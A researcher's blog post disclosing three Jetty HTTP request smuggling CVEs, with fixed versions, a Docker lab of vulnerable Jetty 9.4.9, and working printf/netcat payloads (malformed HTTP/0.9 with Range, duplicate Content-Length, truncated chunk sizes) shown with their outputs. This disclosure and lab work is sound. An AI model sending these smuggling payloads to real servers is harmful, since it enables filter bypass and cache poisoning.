---
layout: post
uuid: 6gacdd-ecb2-2dcefe-446dccda656ec0050e4
title: "Security: HTTP Smuggling, Jetty"
categories: [english, Security]
tags: [Security, CVE, HTTP, Smuggling, Jetty]
pic: old2.jpg
excerpt: details of CVE-2017-7656, CVE-2017-7657 and CVE-2017-7658 (June 2018 - Jetty).
---


<small>**English version** (**Version Française** sur [makina corpus][FRENCH]).</small>
<small>estimated read time: 15min</small>

## Jetty?


[Jetty][JETTY] is a JAVA HTTP sever, but not only, it's also for example a Java servlet server. If you do not know it I think we could compare it to Tomcat. Jetty is a very lightweight part and you can find it [in a lot of projects][JETTY_POWERED].
For the part we are concerned with it's the **HTTP server** which is interesting. Subject of the day is once again HTTP Smuggling, for defects which were reported by us last year (and fixed by the project maintainer a few days after the report).

## Jetty fixed versions 

If you use Jetty in your projects you should ensure your version is greater than :

 * 9.2.x : **9.2.25v20180606**
 * 9.3.x : **9.3.24.v20180605**
 * 9.4.x : **9.4.11.v20280605**
 * not talking about previous versions, before the 9.x, not maintained anymore.

The flaws were disclosed almost one year ago, so if you still have a version older than the listed ones you should really take some time and upgrade.

## The flaws (a summary)

The 3 CVEs refers to somewhat classical flaws (in this specific domain). We are talking about misinterpretation of some syntax limits. Things that should usually trigger errors, but in this case you do not have the errors.

In this article I'll look more specifically at some original flaws, like the HTTP/0.9 or the truncation on chunk size attribute. But it you take a look at the CVE descriptions you can see that several other flaws were also present.

* [CVE-2017-7656][CVE-2017-7656] CVSS v3: 7.5 HIGH CVSS v2: 5.0 MEDIUM :

> In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x
> (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled
> poorly. An HTTP/1 style request line (i.e. method space URI space version) that
> declares a version of HTTP/0.9 was accepted and treated as a 0.9 request.
> If deployed behind an intermediary that also accepted and passed through the 0.9 
> version (but did not act on it), then the response sent could be interpreted by
> the intermediary as HTTP/1 headers. This could be used to poison the cache if the 
> server allowed the origin client to generate arbitrary content in the response. 

* [CVE-2017-7657][CVE-2017-7657] CVSS v3: 7.5 HIGH CVSS v2: 5.0 MEDIUM :

> In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x
> (non-default configuration with RFC2616 compliance enabled), transfer-encoding
> chunks are handled poorly. The chunk length parsing was vulnerable to an integer
> overflow. Thus a large chunk size could be interpreted as a smaller chunk size and
> content sent as chunk body could be interpreted as a pipelined request. If Jetty 
> was deployed behind an intermediary that imposed some authorization and that 
> intermediary allowed arbitrarily large chunks to be passed on unchanged, then this
> flaw could be used to bypass the authorization imposed by the intermediary as the
> fake pipelined request would not be interpreted by the intermediary as a request. 

If you previously read some of my HTTP smuggling posts this is quite classical, you'll note the authentication bypass which is only one of the various attacks that smuggling allows, but for a chunk size number truncation it may be the only type of exploitation available.

* [CVE-2017-7658][CVE-2017-7658] CVSS v3: 9.8 CRITICAL CVSS v2: 7.5 HIGH :

> In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x 
> configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two
> content-lengths headers, Jetty ignored the second. When presented with a 
> content-length and a chunked encoding header, the content-length was ignored 
> (as per RFC 2616). If an intermediary decided on the shorter length, but still
> passed on the longer body, then body content could be interpreted by Jetty as a
> pipelined request. If the intermediary was imposing authorization, the fake 
> pipelined request would bypass that authorization. 

You can see that's this is the **more severe flaw** in terms of security. But it's somewhat classical. We'll certainly find details about this type of attacks on future posts so I wont talk too much about that. This is the oldest flaws (first public work dating 2005) about multiple headers interpreted diffently by various actors. The modern RFC for HTTP expect rejection of such messages.

## Building a test lab

If you want to see the bugs you need some old versions of Jetty, and you need to perform HTTP request on that with netcat + printf commands as shown below. To build this lab the simpliest method is Docker.

Here is a working Dockerfile :

```
FROM jetty:9.4.9
RUN mkdir /var/lib/jetty/webapps/root
RUN bash -c 'set -ex \
  && cd /var/lib/jetty/webapps/root \
  && wget https://tomcat.apache.org/tomcat-7.0-doc/appdev/sample/sample.war \
  && unzip sample.war'
EXPOSE 8080
ENTRYPOINT ["/docker-entrypoint.sh"]
CMD ["java","-jar","/usr/local/jetty/start.jar"]
```

Let's build it an run it, go in the folder containing the previous Dockerfile :

```bash
docker build -t jetty9_4_9 .
docker run --name dockerjetty9_4_9 -p 8994:8080 -d jetty9_4_9
```

You should obtain this:

```bash
$ docker ps
CONTAINER ID        IMAGE               COMMAND                     CREATED             STATUS              PORTS                    NAMES
aa59d97778f1        jetty9_4_9          "/docker-entrypoint(...)"   3 seconds ago       Up 2 seconds        0.0.0.0:8994->8080/tcp   dockerjetty9_4_9
```

You Jetty is available on 127.0.0.1:8994

## Interesting details

I'll skip the small details on spacing and pseudo-spacing errors on request start, special characters allowed on the wrong places, etc. Let's look at the really *funny* stuff.

### HTTP/0.9


HTTP 0.9 syntax is  :

```
GET /path/to/resource\r\n
```

There is **no** protocol version as in :

```
GET /path/to/resource HTTP/0.9\r\n
```

Et we should **not** have headers after this first line as in :

```
GET /path/to/resource HTTP/0.9\r\n
Range: bytes=5-18\r\n
\r\n
```

An HTTP/0.9 response does not contain any meta-information (no header, no content-type, no size).

In jetty there is normally no support for request in 0.9  version. You can make a test on you docker (which is listening on port 8994), typing `printf 'GET /?test=4564\r\n'|nc -q 1 127.0.0.1 8994\r\n` (you need nc, also named netcat).


    $ printf 'GET /?test=4564\r\n'\
    > |nc -q 1 127.0.0.1 8994
    HTTP/1.1 400 HTTP/0.9 not supported
    Content-Type: text/html;charset=iso-8859-1
    Content-Length: 65
    Connection: close
    Server: Jetty(9.4.9.v20180320)
    
    <h1>Bad Message 400</h1><pre>reason: HTTP/0.9 not supported</pre>

If you redo another test leb with a Jetty 9.2 you'll see that we still had support for HTTP 0.9 using a valid syntax.

Until now no problem. But let's add a part with protocol declaration in our line with ` HTTP/0.9`, which is forbidden :

    printf 'GET /?test=4564 HTTP/0.9\r\n'\
    '\r\n'\
    |nc -q 1 127.0.0.1 8994<html>
    
    <head>
    <title>Sample "Hello, World" Application</title>
    </head>
    <body bgcolor=white>
    
    <table border="0">
    <tr>
    (...)

Here Jetty is responding with a 0.9 response, **no headers**, just a body.

We are starting to have some **security problems**. An actor present in the HTTP transmission chain will not consider ` HTTP/0.9` as a valid HTTP v0.9 syntax and could read the response as an HTTP/1.0 or HTTP/1.1 response.

Let's add another problem which renders this pseudo support really ... problematic, **headers from the request are read and interpreted**. They should not, there're no headers in v0.9.

We add a `range` header to check if the requets can extract any subpart of the response :

    printf 'GET /?test=4564 HTTP/0.9\r\n'\
    'Range: bytes=36-42\r\n'\
    '\r\n'\
    |nc -q 1 127.0.0.1 8994
    
    , World

**Victory**.

This means we can use a request which is not officially an HTTP/0.9 request (as we have a wrong protocol version ` HTTP/0.9` part inside), with header support, and that we can choose quite easily the part of the response that will be returned, without headers added by the HTTP server. The idea beside this, to exploit the flaws, is to extract a fake HTTP/1.0 or HTTP/1.1 response, hidden for example in an image.

If an invalid HTTP/0.9 request is sent through a Reverse Proxy (which does not detect it as an 0.9 query), the response could be interpreted as a valid HTTP/1.1 response if the response content looks like HTTP/1.1 protocol.

You can hide a complete HTTP response (headers + body) in the EXIF data of an image, extract this section with a range query, and use this data chunk as a valid HTTP/1.1 response. If you look at the second example in [this video][ATTACK_EXAMPLES] it was the effect obtained on golaong. You'll just need the ability to upload the file containing this response on the server, and a Reverse proxy  support this HTTP/0.9.


### Double Content-Length

We'll do it fast, this is a request splitting attack, in some specific configurations you can obtain two answers by doubling the Content-Length header. Doubling it is strictly forbidden, because when you do it we cannot known which header is the right one to read to evaluate the body size, it depends on the actor interpreting the HTTP stream.

First problem, on version 9.2 it was still allowed to use two "Content-Length" headers. On versions 9.3 and 9.4 it was harder, but if the **first header value is 0** this was still allowed.

```
Rejected:
    Content-Length: 200\r\n
    Content-Length: 99\r\n
Rejected:
    Content-Length: 200\r\n
    Content-Length: 200\r\n
Rejected:
    Content-Length: 0\r\n
    Content-Length: 200\r\n
    Content-Length: 0\r\n
Rejected:
    Content-Length: 0\r\n
    Content-Length: 99\r\n
    Content-Length: 200\r\n
Rejected:
    Content-Length: 200\r\n
    Content-Length: 0\r\n
Accepted:
    Content-Length: 0\r\n
    Content-Length: 200\r\n
```

Exemple in the lab:

```bash
printf 'GET /?test=4966 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Connection: keepalive\r\n'\
'Content-Length: 45\r\n'\
'Content-Length: 0\r\n'\
'\r\n'\
'GET /?test=4967 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8994 | grep "HTTP"

HTTP/1.1 400 Duplicate Content-Length
```

Here it was a nice rejection, that's OK.

```bash
printf 'GET /?test=4968 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Connection: keepalive\r\n'\
'Content-Length: 0\r\n'\
'Content-Length: 45\r\n'\
'\r\n'\
'GET /?test=4969 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8994 | grep "HTTP"

HTTP/1.1 200 OK
```

And then no rejection. You could say "there's no splitting, we have only one response". The problem in fact is that the only good response is to **reject** the message.
Let's imagine that we use a longer pipeline :

```bash
printf 'GET /?test=4970 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Connection: keepalive\r\n'\
'Content-Length: 0\r\n'\
'Content-Length: 45\r\n'\
'\r\n'\
'GET /?test=4971 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'\r\n'\
'GET /?test=4972 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8994 | grep "HTTP"

HTTP/1.1 200 OK
HTTP/1.1 200 OK
```

We have **two responses**, but if we go through another actor which also forgot to reject the invalid message, this actor could interpret this pipeline as three queries and expect three responses instead of two (as there's no good way of choosing which Content-Length header is the right one). So this would start a response mix, and that's not good at all.

This is in fact one of the key point of HTTP Smuggling, bif problems always comes when several issues, on several actors, are combined together to generate chaos.

### Chunk size attribute truncation

You may have detected in the previous examples my usage of grep at the end of the command. That's not required, it's just a way to detect faster the number of responses received by the test.

To change things I'll start directly with the test :

```bash
printf 'POST /?test=4973 HTTP/1.1\r\n'\
'Transfer-Encoding: chunked\r\n'\
'Content-Type: application/x-www-form-urlencoded\r\n'\
'Host: localhost\r\n'\
'\r\n'\
'100000000\r\n'\
'\r\n'\
'POST /?test=4974 HTTP/1.1\r\n'\
'Content-Length: 5\r\n'\
'Host: localhost\r\n'\
'\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8994|grep "HTTP/1.1"

HTTP/1.1 200 OK
HTTP/1.1 200 OK
```

Result is **two responses**. But did we really had two requests ?

In what looks like the first request we announc `Transfer-Encoding: chunked`. It means we ignore anything related to Content-Length for body size calculation, we'll use chunks of data and an end-of-chunks marker to mark the end of the body. So we should get something like that in the request body :

```
5\r\n
xxxxxx\r\n
5\r\n
\r\n
xxxxxx\r\n
0\r\n
\r\n
```

That is :

```
<size of 1st chunk in hexa>\r\n
xxxxxx<chunk content>xxxxx\r\n
<size of 2nd chunk in hexa>\r\n
xxxxxx<chunk content>xxxxx\r\n
<size 0, dlast chunk, end of transmission>\r\n
\r\n

```

Our first request tells us, in hexa, a huge chunk with a size of 1000000000 (for decimal value I'll let you compute it, but really this is very huge). And we can understand that Jetty saw that as a '0', so a last chunk marker, and `POST /?test=4974` and all the following stuff has become a request, it was in reality just some garbage body data that the HTTP parser must not interpret.

Let's look at a second example :

```bash
printf 'POST /?test=4975 HTTP/1.1\r\n'\
'Transfer-Encoding: chunked\r\n'\
'Content-Type: application/x-www-form-urlencoded\r\n'\
'Host: localhost\r\n'\
'\r\n'\
'1ff00000008\r\n'\
'abcdefgh\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
'POST /?test=4976 HTTP/1.1\r\n'\
'Content-Length: 5\r\n'\
'Host: localhost\r\n'\
'\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8994|grep "HTTP/1.1"

HTTP/1.1 200 OK
HTTP/1.1 200 OK
```

Two responses again, `1ff00000008` was interpreted as a `8` and only `abcdefgh` was used for the body.

Solution of this mistery is that Jetty is (was) only taking the last 8 bytes of the *chunk size* attribute (that looks a lot like the CVE-2015-3183 Apache issue that we found years ago, but the truncation was on the first bytes, not the last ones, and on more than 30 bytes) :
 
```
ffffffffffff00000000\r\n
            ^^^^^^^^
            00000000 => size 0

1ff00000008\r\n
   ^^^^^^^^
   00000008 => size 8
```

An HTTP server can say that such huge attribute for 'size of chunk' is too big, and can then emit an HTTP error (like an error 400), but truncating the attribute used to compute the size of the bdoy is very dangerous. Here an attack would use a Reverse Proxy transmiting the chunks without rewriting it (that's a quite common case), and that would still be forwarding the arbitrary data of the first chunk, (with an unterminated request the reverse proxy is expecting several thousands of TeraBytes in input, that's what the client is announcing). On the Jetty side we would have ended the first query long ago, starting to handle the next requests in the pipeline that no-one saw before (in the previous example the `POST /?test=4976`). Then sending a second response.

From the various tests I made, Reverse Proxies does not like receiving responses as they still transfer data for the first request, and if they did not cut the communication at this precise moment they would still cut the communication when a second response is received. The issue is that this second request could be a forbidden request. The security filters that could exists in these Reverse proxies, WAF, load balancers, did not detect this second query, that's a **security filter bypass**.

Currently I do not see any other exploitation available, but someone with a creative mind may find a new one.

Next time we'll talk about **Apache Traffic Server**, with a lot more lab manipulations for the people which expect to train themselves on playing with requests using limits of the protocol.

## Timeline

* 15 mai 2018: security report sent
* 25 juin 2018: [official public announce][ANNOUNCE] by the project
* avril 2019: this page

## See also

* [basics of HTTP Smuggling](http://regilero.github.io/security/english/2015/10/04/http_smuggling_in_2015_part_one/)
* [Pound SSl terminator smuggling issues](http://regilero.github.io/security/english/2018/07/03/security_pound_http_smuggling/)
* Video [Defcon HTTP Smuggling](https://www.youtube.com/watch?v=dVU9i5PsMPY)
* [Defcon support](https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Regilero-Hiding-Wookiees-In-Http.pdf)
* Video [Defcon demos](https://www.youtube.com/watch?v=lY_Mf2Fv7kI)


[JETTY]: http://www.eclipse.org/jetty
[FRENCH]: https://www.makina-corpus.com/blog/metier/2019/contrebande-de-http-http-smuggling-jetty
[ENGLISH]: https://regilero.github.io//security/english/2018/07/03/security_pound_http_smuggling
[ATTACK_EXAMPLES]: https://www.youtube.com/watch?v=lY_Mf2Fv7kI
[ANNOUNCE]: https://www.eclipse.org/lists/jetty-announce/msg00123.html
[CVE-2017-7656]: https://nvd.nist.gov/vuln/detail/CVE-2017-7656
[CVE-2017-7657]: https://nvd.nist.gov/vuln/detail/CVE-2017-7657
[CVE-2017-7658]: https://nvd.nist.gov/vuln/detail/CVE-2017-7658
[JETTY_POWERED]: http://www.eclipse.org/jetty/powered/powered.html

